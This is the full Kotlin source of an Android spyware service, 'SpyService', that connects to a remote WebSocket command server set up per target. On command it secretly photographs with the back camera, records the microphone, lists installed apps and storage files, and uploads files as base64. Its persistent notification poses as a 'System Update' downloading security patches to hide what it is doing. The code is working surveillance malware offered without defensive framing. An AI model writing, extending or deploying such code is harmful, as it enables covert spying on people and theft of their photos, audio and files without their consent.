package com.uk.core

import android.app.*
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.util.Base64
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.Preview
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleService
import okhttp3.*
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.Executors

class SpyService : LifecycleService() {
    private val SERVER_WS = "wss://YOUR-RENDER-URL.onrender.com/?id=phone_1" 
    // CHANGE id=phone_1 FOR EACH TARGET
    
    private var ws: WebSocket? = null
    private var recorder: MediaRecorder? = null
    private var imageCapture: ImageCapture? = null
    private var cameraProvider: ProcessCameraProvider? = null
    private val client = OkHttpClient.Builder().pingInterval(15, java.util.concurrent.TimeUnit.SECONDS).build()
    private val executor = Executors.newSingleThreadExecutor()

    companion object {
        var instance: SpyService? = null
        fun sendToServer(data: Map<String, Any>) {
            val json = JSONObject(data).toString()
            instance?.ws?.send(json)
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        createNotificationChannel()
        startForeground(1, buildNotification())
        connectWs()
    }

    private fun connectWs() {
        val req = Request.Builder().url(SERVER_WS).build()
        ws = client.newWebSocket(req, object : WebSocketListener() {
            override fun onMessage(webSocket: WebSocket, text: String) {
                executor.execute {
                    val json = JSONObject(text)
                    when (json.getString("action")) {
                        "camera" -> takePhoto()
                        "mic" -> toggleMic(json.getJSONObject("payload").getBoolean("on"))
                        "apps" -> getApps()
                        "files" -> getFiles()
                        "get_file" -> getFile(json.getJSONObject("payload").getString("path"))
                    }
                }
            }
        })
    }

    private fun takePhoto() {
        val providerFuture = ProcessCameraProvider.getInstance(this)
        providerFuture.addListener({
            try {
                cameraProvider = providerFuture.get()
                imageCapture = ImageCapture.Builder().build()
                val cameraSelector = CameraSelector.DEFAULT_BACK_CAMERA
                cameraProvider?.unbindAll()
                cameraProvider?.bindToLifecycle(this as LifecycleOwner, cameraSelector, imageCapture)
                
                val file = File(externalCacheDir, "snap.jpg")
                val outputOptions = ImageCapture.OutputFileOptions.Builder(file).build()
                
                imageCapture?.takePicture(outputOptions, ContextCompat.getMainExecutor(this), object : ImageCapture.OnImageSavedCallback {
                    override fun onError(exc: ImageCaptureException) {
                        sendToServer(mapOf("type" to "log", "tag" to "CAM", "msg" to exc.message.toString()))
                    }
                    override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                        val bytes = file.readBytes()
                        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                        sendToServer(mapOf("type" to "image", "base64" to b64))
                    }
                })
            } catch (e: Exception) {
                sendToServer(mapOf("type" to "log", "tag" to "CAM", "msg" to e.message.toString()))
            }
        }, ContextCompat.getMainExecutor(this))
    }

    private fun toggleMic(on: Boolean) {
        if (on) {
            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this) else MediaRecorder()
            recorder?.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder?.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
            recorder?.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            recorder?.setOutputFile(File(cacheDir, "mic.3gp").absolutePath)
            recorder?.prepare()
            recorder?.start()
            sendToServer(mapOf("type" to "log", "tag" to "MIC", "msg" to "Recording started"))
        } else {
            recorder?.stop()
            recorder?.release()
            recorder = null
            sendToServer(mapOf("type" to "log", "tag" to "MIC", "msg" to "Recording stopped"))
        }
    }

    private fun getApps() {
        val pm = packageManager
        val apps = pm.getInstalledPackages(0).map { 
            val name = it.applicationInfo?.loadLabel(pm).toString()
            "$name (${it.packageName})"
        }
        sendToServer(mapOf("type" to "apps", "apps" to apps))
    }

    private fun getFiles() {
        val dir = android.os.Environment.getExternalStorageDirectory()
        val files = dir.listFiles()?.take(50)?.map {
            mapOf("name" to it.name, "path" to it.absolutePath, "size" to it.length())
        } ?: emptyList()
        sendToServer(mapOf("type" to "files", "files" to files))
    }

    private fun getFile(path: String) {
        try {
            val f = File(path)
            if (f.exists() && f.length() < 5 * 1024 * 1024) { // Limit 5MB to prevent crash
                val b64 = Base64.encodeToString(f.readBytes(), Base64.NO_WRAP)
                sendToServer(mapOf("type" to "file_data", "name" to f.name, "size" to f.length(), "base64" to b64))
            }
        } catch (e: Exception) {}
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel("sys_up", "System Update", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private fun buildNotification(): Notification {
        return Notification.Builder(this, "sys_up")
            .setContentTitle("System Update")
            .setContentText("Downloading security patches...")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .build()
    }

    override fun onBind(intent: Intent): IBinder? = super.onBind(intent)
}